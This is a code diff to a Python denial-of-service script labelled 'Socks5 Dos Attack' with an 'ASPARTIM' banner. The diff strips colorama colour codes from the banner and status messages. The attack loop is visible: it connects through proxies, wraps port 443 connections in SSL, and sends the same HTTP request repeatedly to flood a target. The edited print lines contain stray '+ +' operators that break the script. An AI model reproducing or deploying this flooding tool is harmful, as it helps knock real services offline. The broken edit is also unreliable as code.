@@ -5,11 +5,10 @@ import threading
 import random 
 import ssl 
 import time
-from colorama import Fore
 
 
 
-print(Fore.RED + """
+print("""
       .---.        .-----------
      /     \  __  /    ------
     / /     \(..)/    -----
@@ -22,7 +21,7 @@ print(Fore.RED + """
              ''``
            ASPARTIM
 ------------------------------- """)
-print(Fore.WHITE + "Socks5 Dos Attack")
+print("Socks5 Dos Attack")
 print(" ")
 
 useragent = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
@@ -219,11 +218,11 @@ def atk():
 			if str(port) =='443':
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(request))
-			print(Fore.GREEN + "AsparTim Attack Successful [" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.GREEN + "]")
+			print("AsparTim Attack Successful [" + + str(proxy[0])+":"+str(proxy[1])+  + "]")
 			try:
 				for y in range(per):
 					s.send(str.encode(request))
-				print(Fore.GREEN + "AsparTim Attack Successful [" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.GREEN + "]")
+				print("AsparTim Attack Successful [" +  + str(proxy[0])+":"+str(proxy[1])+  + "]")
 			except:
 				s.close()
 		except:
